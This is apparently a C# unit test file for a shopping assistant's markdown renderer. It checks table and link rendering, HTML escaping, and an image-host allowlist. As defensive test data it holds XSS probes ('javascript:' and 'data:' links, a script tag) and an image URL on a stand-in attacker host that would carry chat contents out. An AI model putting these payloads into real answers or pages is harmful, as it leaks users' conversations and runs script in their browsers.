using LouisAgent.Web.Text;

namespace LouisAgent.Web.Tests.Text;

/// <summary>
/// The markdown an answer is shown with. Tables and links render; raw HTML is text, never markup; only plain web and
/// mail links survive; an image loads only from a shop's own host, and any other becomes a link.
/// </summary>
public class MarkdownTests
{
    /// <summary>The HTML this markdown renders to.</summary>
    private static string Html(string markdown) => Markdown.ToHtml(markdown).Value;

    /// <summary>A table renders.</summary>
    [Test]
    public void ATable_Renders()
    {
        string html = Html("| Bestanddeel | Prys |\n|---|---|\n| Rys | R24,99 |\n");

        Assert.That(html, Does.Contain("<table>").And.Contain("<th>Bestanddeel</th>").And.Contain("<td>R24,99</td>"));
    }

    /// <summary>A link renders with its address.</summary>
    [Test]
    public void ALink_Renders_WithItsAddress()
    {
        string html = Html("Sien [Checkers](https://www.checkers.co.za/) en https://example.com/pad.");

        Assert.That(html, Does.Contain("<a href=\"https://www.checkers.co.za/\">Checkers</a>"));
        Assert.That(html, Does.Contain("href=\"https://example.com/pad\""), "an autolink too");
    }

    /// <summary>An unsafe link loses its address.</summary>
    [Test]
    public void AnUnsafeLink_LosesItsAddress()
    {
        Assert.That(Html("[klik](javascript:alert(1))"), Does.Contain("href=\"#\"").And.Not.Contain("javascript:"));
        Assert.That(Html("[data](data:text/html;base64,AAAA)"), Does.Contain("href=\"#\"").And.Not.Contain("data:"));
        Assert.That(Html("[pos](mailto:puls@example.com)"), Does.Contain("href=\"mailto:puls@example.com\""));
    }

    /// <summary>A shop's image shows, with its original for the dialog.</summary>
    [Test]
    public void AShopsImage_IsShown_WithItsOriginalForTheDialog()
    {
        string html = Html("![KOO Chakalaka](https://catalog.sixty60.co.za/a/b.jpg?w=300)");

        Assert.That(html, Does.Contain("<img"));
        Assert.That(html, Does.Contain("src=\"https://catalog.sixty60.co.za/a/b.jpg?w=300\""));
        Assert.That(html, Does.Contain("data-original=\"https://catalog.sixty60.co.za/a/b.jpg\""), "the same file, without the size");
    }

    /// <summary>
    /// The other shops' photos come from their sites' own image hosts; Pick n Pay numbers its CDN hosts, so its whole
    /// domain is allowed.
    /// </summary>
    [TestCase("https://cdn-prd-02.pnp.co.za/sys-master/images/h54/h01/11447239901214/silo-product-image-v2_96Wx96H")]
    [TestCase("https://cdn-prd-01.pnp.co.za/sys-master/images/hff/h45/26601180921886/product_96Wx96H")]
    [TestCase("https://assets.woolworthsstatic.co.za/Lean-Beef-Mince-1-kg-20144807.jpg?V=lIVo&w=310&q=85")]
    public void AnotherShopsImage_IsShownToo(string url)
    {
        string html = Html($"![produk]({url})");

        Assert.That(html, Does.Contain("<img").And.Contain($"src=\"{url.Replace("&", "&amp;")}\""));
    }

    /// <summary>An image whose query holds its key keeps it in the original, without the size.</summary>
    [Test]
    public void AnImage_WhoseQueryHoldsItsKey_KeepsItInTheOriginal_WithoutTheSize()
    {
        // Woolworths' image URL carries its file's key (o=…) beside the size (w, q): the dialog's original keeps the key.
        string html = Html("![produk](https://assets.woolworthsstatic.co.za/Brown-Onions.jpg?V=lIVo&o=eyJidWNrZXQ&w=310&q=85)");

        Assert.That(html, Does.Contain("data-original=\"https://assets.woolworthsstatic.co.za/Brown-Onions.jpg?V=lIVo&amp;o=eyJidWNrZXQ\""));
    }

    /// <summary>A host that only ends like a shop's becomes a link.</summary>
    [Test]
    public void AnImage_FromAHostThatOnlyEndsLikeAShop_BecomesALink()
    {
        string html = Html("![foto](https://evilpnp.co.za/track.png)");

        Assert.That(html, Does.Not.Contain("<img"));
    }

    /// <summary>Any other image becomes a link, and is never loaded.</summary>
    [Test]
    public void AnyOtherImage_BecomesALink_NeverLoaded()
    {
        string html = Html("![foto](https://evil.example/track.png?chat=secret)");

        Assert.That(html, Does.Not.Contain("<img"));
        Assert.That(html, Does.Contain("<a href=\"https://evil.example/track.png?chat=secret\">foto</a>"));
    }

    /// <summary>Raw HTML shows as text.</summary>
    [Test]
    public void RawHtml_IsShownAsText()
    {
        string html = Html("Kyk <script>alert(1)</script> en <b>vet</b>");

        Assert.That(html, Does.Not.Contain("<script>").And.Not.Contain("<b>"));
        Assert.That(html, Does.Contain("&lt;script&gt;"));
    }
}
